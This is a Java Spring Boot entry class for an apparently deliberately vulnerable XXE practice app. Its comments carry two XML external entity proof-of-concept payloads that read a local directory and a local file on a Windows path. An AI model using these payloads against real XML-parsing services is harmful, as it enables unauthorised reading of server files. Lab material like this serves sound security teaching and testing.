package com.example;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.web.server.WebServerFactoryCustomizer;
import org.springframework.boot.web.servlet.server.ConfigurableServletWebServerFactory;

/*
读取目录POC
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
        <!ELEMENT data (content)>
        <!ELEMENT content (#PCDATA)>
        <!ENTITY xxe SYSTEM "file:///C:/Users/luke10481/Desktop">
        ]>
<data>
    <content>&xxe;</content>
</data>
 */

/*
读取文件POC(读取C:/Users/luke10481/Desktop/userfile.txt)
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
        <!ELEMENT data (content)>
        <!ELEMENT content (#PCDATA)>
        <!ENTITY xxe SYSTEM "file:///C:/Users/luke10481/Desktop/userfile.txt">
        ]>
<data>
    <content>&xxe;</content>
</data>
 */

@SpringBootApplication
public class XxeVulnerableApp implements WebServerFactoryCustomizer<ConfigurableServletWebServerFactory> {

	public static void main(String[] args) {
		SpringApplication.run(XxeVulnerableApp.class, args);
	}
	@Override
	public void customize(ConfigurableServletWebServerFactory factory) {
		// TODO Auto-generated method stub
		factory.setPort(8099);
	}

}